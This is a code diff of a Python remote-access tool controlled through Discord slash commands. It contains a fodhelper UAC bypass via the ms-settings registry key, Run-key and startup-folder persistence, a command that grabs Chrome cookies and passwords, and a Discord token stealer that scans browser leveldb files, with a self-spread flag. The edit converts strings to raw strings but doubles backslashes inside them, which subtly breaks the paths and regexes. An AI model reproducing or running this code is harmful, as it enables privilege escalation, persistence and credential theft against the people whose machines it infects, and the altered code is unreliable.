@@ -839,9 +839,9 @@ async def AdminForce_command(ctx: SlashContext):
         await ctx.send(f"attempting to get admin privileges. . .")
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == False:
-            os.system("""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force""")
-            os.system("""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force""") 
-            os.system("""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start""" + sys.argv[0] +"-Force")
+            os.system(r"""powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force""")
+            os.system(r"""powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force""") 
+            os.system(r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start""" + sys.argv[0] +"-Force")
             
             class disable_fsr():
                 disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
@@ -856,7 +856,7 @@ async def AdminForce_command(ctx: SlashContext):
                 os.system("fodhelper.exe")
 
             sleep(2)
-            os.system("""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force""")
+            os.system(r"""powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force""")
         else:
             await ctx.send("You already have admin privileges")
 
@@ -866,14 +866,14 @@ async def Startup_command(ctx: SlashContext, reg_name: str):
     if ctx.channel.name == channel_name:
         try:
             key1 = winreg.HKEY_CURRENT_USER
-            key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            key_value1 =r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
             open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
 
             winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
             open_.Close()
             await ctx.send("Successfully added it to `run` startup")
         except PermissionError:
-            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
+            shutil.copy(sys.argv[0], os.getenv("appdata")+r"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
             await ctx.send("Permission was denied, added it to `startup folder` instead")
 
 @slash.slash(name="GrabPasswords", description="Grabs google cookies and passwords", guild_ids=g)
@@ -950,13 +950,13 @@ async def DiscordInfo_command(ctx:SlashContext):
         LOCAL = os.getenv("LOCALAPPDATA")
         ROAMING = os.getenv("APPDATA")
         PATHS = {
-            "Discord": ROAMING + "\\Discord",
-            "Discord Canary": ROAMING + "\\discordcanary",
-            "Discord PTB": ROAMING + "\\discordptb",
-            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+            "Discord": ROAMING + r"\\Discord",
+            "Discord Canary": ROAMING + r"\\discordcanary",
+            "Discord PTB": ROAMING + r"\\discordptb",
+            "Google Chrome": LOCAL + r"\\Google\\Chrome\\User Data\\Default",
+            "Opera": ROAMING + r"\\Opera Software\\Opera Stable",
+            "Brave": LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            "Yandex": LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
         }
 
 
@@ -979,13 +979,13 @@ async def DiscordInfo_command(ctx:SlashContext):
 
 
         def getTokenz(path):
-            path += "\\Local Storage\\leveldb"
+            path += r"\\Local Storage\\leveldb"
             tokens = []
             for file_name in os.listdir(path):
                 if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                     continue
                 for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                    for regex in (r"[\\w-]{24}\.[\\w-]{6}\.[\\w-]{27}", r"mfa\.[\\w-]{84}"):
+                    for regex in (r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", r"mfa\\.[\\w-]{84}"):
                         for token in findall(regex, line):
                             tokens.append(token)
             return tokens
@@ -1039,7 +1039,7 @@ async def DiscordInfo_command(ctx:SlashContext):
             
 
         def main():
-            cache_path = ROAMING + "\\.cache~$"
+            cache_path = ROAMING + r"\\.cache~$"
             prevent_spam = True
             self_spread = True
             embeds = []
